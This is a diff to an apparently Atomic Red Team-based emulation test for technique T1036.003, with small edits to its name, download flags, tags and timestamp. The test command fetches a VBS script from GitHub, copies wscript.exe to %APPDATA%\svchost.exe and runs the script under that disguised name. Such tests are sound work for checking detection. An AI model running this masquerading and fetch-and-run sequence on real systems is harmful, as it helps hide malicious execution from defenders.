@@ -9,7 +9,7 @@
   tactic: stealth
   technique:
     attack_id: T1036.003
-    name: 'Masquerading: Rename System Utilities'
+    name: 'Masquerading: Rename Legitimate Utilities'
   platforms:
     windows:
       sh:
@@ -17,9 +17,9 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs")
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs";
-          fi; copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y; cmd.exe
-          /c %APPDATA%\svchost.exe "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"'
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"
+          -UseBasicParsing; fi; copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe
+          /Y; cmd.exe /c %APPDATA%\svchost.exe "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"'
         cleanup: del /Q /F %APPDATA%\svchost.exe >nul 2>&1
   plugin: atomic
   singleton: false
@@ -27,9 +27,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - stealth
   - t1036.003
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     dependencies:
@@ -45,8 +45,9 @@
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs"
         -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"
+        -UseBasicParsing
 
         '
     technique_created: '2020-02-10T20:03:11.691Z'
     atomic_guid: 24136435-c91a-4ede-9da1-8b284a1c1a23
-    import_timestamp: '2026-10-20T07:08:26.850684Z'
+    import_timestamp: '2026-10-21T07:01:49.594101Z'
